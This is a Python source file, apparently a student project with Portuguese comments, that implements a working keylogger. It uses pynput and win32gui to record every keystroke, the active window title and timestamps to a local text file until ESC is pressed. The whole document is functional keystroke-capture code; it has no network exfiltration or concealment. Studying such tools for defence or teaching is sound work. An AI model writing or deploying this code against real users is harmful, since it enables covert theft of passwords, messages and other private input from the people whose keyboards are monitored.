"""
---------------------------------------------------------
Projeto: Keylogger em Python
Autor: Guilherme Pinheiro Santos
Descrição:
    Este script captura as teclas digitadas no teclado e salva em um arquivo texto.
    Também registra a janela ativa, horário das teclas e status da tecla Caps Lock.
Bibliotecas usadas:
    - pynput (para monitorar teclas)
    - win32gui (para identificar janela ativa no Windows)
---------------------------------------------------------
"""

#Imports
from pynput import keyboard
import win32gui
from datetime import datetime


# Nome do arquivo onde as teclas digitadas serão salvas
log_file = "captura_teclas.txt"


# Armazenar o nome da janela ativa no momento da digitação
janela_atual = ""


# Flag que indica se o Caps Lock está ativo
caps_lock_ativo = False


# Retorna o título da janela que está ativa no momento (aquela que o usuário está usando ou interagindo no instante da execução).
def get_janela_ativa():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())


# Essa função é chamada automaticamente toda vez que uma tecla é pressionada.
# Ela realiza o registro da tecla pressionada, identifica se houve mudança de janela e lida com o estado do Caps Lock e teclas especiais.
def on_press(key):
    global caps_lock_ativo
    global janela_atual

    nova_janela = get_janela_ativa()
    if nova_janela != janela_atual:
        janela_atual = nova_janela
        with open (log_file, "a", encoding="utf-8") as f:
            f.write(f"\n\n[{datetime.now().strftime('%H:%M:%S')}] Janela ativa: {janela_atual}\n")


    if key == keyboard.Key.caps_lock:
        caps_lock_ativo = not caps_lock_ativo

    try:
        with open(log_file, "a") as f:
            if caps_lock_ativo:
                f.write(f"{key.char.upper()}")
            else:
                f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.enter:
                f.write("[ENTER]\n")  # pula uma linha
            else:
                f.write(teclas_especiais.get(str(key), f"[{key}]"))


# Essa função é chamada sempre que uma tecla é liberada (ou seja, quando o usuário solta a tecla após pressioná-la).
# Ela verifica se a tecla liberada foi ESC e, se sim, encerra o keylogger.
def on_release(key):
    if key == keyboard.Key.esc:
        print("Encerrando o Keylogger.")
        return False


# Este dicionário mapeia as teclas especiais capturadas pelo programa para suas representações em texto legível, que serão gravadas no arquivo de log.
teclas_especiais = {
    'Key.space': '[ESPAÇO]',
    'Key.enter': '[ENTER]',
    'Key.tab': '[TAB]',
    'Key.backspace': '[BACKSPACE]',
    'Key.esc': '[ESC]',
    'Key.shift': '[SHIFT]',
    'Key.ctrl_l': '[CTRL]',
    'Key.crtl_r': '[CTRL]',
    'Key.alt_gr': '[ALT GR]',
    'Key.alt_l': '[ALT]',
    'Key.alt_r': '[ALT]',
    'Key.caps_lock': '[CAPSLOCK]'
}


# Responsável por abrir um arquivo de log (log_file) em modo de escrita ("w") e limpá-lo, ou seja, apagar todo o seu conteúdo toda vez que o script entrar em execução
# Este código é comumente utilizado para limpar um arquivo de log antes de iniciar um novo processo, como por exemplo:
# Garantir que não existam dados antigos no arquivo.
# Preparar o arquivo para novas escritas durante a execução do programa.
with open(log_file, "w") as f:
    f.write("")


# Este código inicia um keylogger que monitora e registra as teclas pressionadas e liberadas pelo usuário. Ele utiliza a biblioteca pynput.keyboard para escutar os eventos do teclado.
with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    print('Keylogger iniciado "Vamos capturar algumas teclas meu pequeno hacker." Precione ESC para encerrar.')
    listener.join()